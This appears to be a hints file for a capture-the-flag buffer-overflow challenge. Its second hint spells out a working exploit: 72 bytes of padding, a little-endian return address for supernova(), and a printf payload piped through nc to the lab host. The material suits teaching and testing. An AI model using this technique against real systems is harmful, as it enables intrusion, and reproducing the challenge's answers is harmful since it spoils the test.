hints:
  - content: "The buffer is 64 bytes, and 8 more bytes of saved data sit before the return address. That's 72 bytes in total."
    cost: 0
  - content: "Addresses are stored backwards (little-endian) in 8 bytes. Read `supernova()`'s address from the program's own line (it stays the same unless the program is rebuilt), then send 72 bytes of padding followed by that address. On your own machine with Python: read the banner, pull the address out with a regex, then send `b'A'*72 + struct.pack('<Q', addr)`. From the Calvera account there's no Python, so use `printf`: for the address `0x4017c5` that's `printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xc5\\x17\\x40\\x00\\x00\\x00\\x00\\x00' | nc jabbah 9001`."
    cost: 0
